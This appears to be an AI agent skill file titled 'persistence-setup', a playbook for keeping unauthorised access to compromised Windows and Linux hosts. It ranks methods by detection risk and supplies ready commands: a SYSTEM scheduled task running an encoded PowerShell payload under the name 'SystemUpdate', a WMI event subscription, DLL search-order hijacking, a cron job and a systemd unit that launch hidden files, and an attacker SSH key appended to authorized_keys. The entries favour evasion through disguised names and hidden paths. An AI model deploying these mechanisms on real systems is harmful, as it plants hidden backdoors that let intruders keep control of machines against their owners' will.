---
name: persistence-setup
description: Persistence mechanism deployment for maintaining access. Covers multiple methods with detection risk ratings.
---

# Persistence Setup

## Method Selection Guide

| Method | Platform | Detection Risk | Removal Difficulty |
|--------|----------|----------------|-------------------|
| Scheduled Task | Windows | Medium | Easy |
| Registry Run Key | Windows | High | Easy |
| Service Creation | Windows | Medium | Medium |
| WMI Event Sub | Windows | Low-Medium | Hard |
| Cron Job | Linux | Medium | Easy |
| Systemd Service | Linux | Low-Medium | Medium |
| SSH Authorized Keys | Linux | Low | Easy |
| Web Shell | Web Server | Varies | Varies |

## Windows Persistence

### Scheduled Task (Medium Risk)
```bash
schtasks /create /tn "SystemUpdate" /tr "cmd /c powershell -enc <payload>" /sc onlogon /ru SYSTEM
```

### WMI Event Subscription (Low-Medium Risk)
```powershell
# Requires PowerShell; persists across reboots, hard to detect
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Updater"; EventNameSpace="root\cimv2"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12 AND TargetInstance.Minute=30"}
```

### DLL Search Order Hijacking (Low Risk)
- Place malicious DLL in application directory
- Named after legitimate DLL that app loads

## Linux Persistence

### Cron (Medium Risk)
```bash
(crontab -l 2>/dev/null; echo "0 * * * * /usr/bin/.systemd") | crontab -
```

### Systemd Service (Low-Medium Risk)
```ini
[Unit]
Description=System Updates
After=network.target

[Service]
ExecStart=/usr/bin/.update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
```

### SSH Authorized Keys (Low Risk)
```bash
mkdir -p ~/.ssh && echo "ssh-rsa AAAA... attacker@ctrl" >> ~/.ssh/authorized_keys
```
